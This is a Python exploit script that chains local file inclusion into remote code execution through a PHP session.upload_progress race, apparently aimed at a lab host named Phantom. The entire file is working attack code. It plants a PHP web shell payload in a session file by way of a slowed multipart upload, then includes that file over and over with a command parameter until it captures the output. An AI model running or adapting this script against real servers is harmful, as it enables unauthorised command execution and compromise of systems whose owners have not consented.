#!/usr/bin/env python3
"""LFI->RCE via PHP session.upload_progress race condition against Phantom (192.168.5.237)."""
import requests, threading, time, sys, io

TARGET = "http://192.168.5.237/"
SESSID = "evilsess"
PAYLOAD = b'<?php system($_GET["c"]); ?>'
CMD = sys.argv[1] if len(sys.argv) > 1 else "id"

stop = threading.Event()

def slow_upload():
    boundary = "----boundary123"
    # Build a multipart body with PHP_SESSION_UPLOAD_PROGRESS first, then a large file field
    # sent slowly via a generator to keep the session file alive on disk longer.
    pre = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    ).encode() + PAYLOAD + b"\r\n"
    pre += (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="x.txt"\r\n'
        f"Content-Type: text/plain\r\n\r\n"
    ).encode()
    big = b"A" * 1024 * 1024 * 5  # 5MB filler to slow the upload
    post_data = b"\r\n" + f"--{boundary}--\r\n".encode()

    def gen():
        yield pre
        for i in range(0, len(big), 4096):
            if stop.is_set():
                return
            yield big[i:i+4096]
            time.sleep(0.01)
        yield post_data

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Cookie": f"PHPSESSID={SESSID}",
    }
    try:
        requests.post(TARGET, data=gen(), headers=headers, timeout=20)
    except Exception as e:
        print("upload thread ended:", e)

def race_include():
    url = TARGET + f"?page=/var/lib/php/sessions/sess_{SESSID}&c=" + requests.utils.quote(CMD)
    headers = {"Cookie": f"PHPSESSID={SESSID}"}
    for _ in range(300):
        if stop.is_set():
            return
        try:
            r = requests.get(url, headers=headers, timeout=3)
            if "class=\"card\">" in r.text:
                card = r.text.split('class="card">',1)[1].split('</div>',1)[0].strip()
                if card and "php" not in card.lower()[:5]:
                    print("=== GOT OUTPUT ===")
                    print(card)
                    stop.set()
                    return
        except Exception:
            pass

t1 = threading.Thread(target=slow_upload)
t1.start()
time.sleep(0.3)
race_include()
stop.set()
t1.join(timeout=2)
print("done")
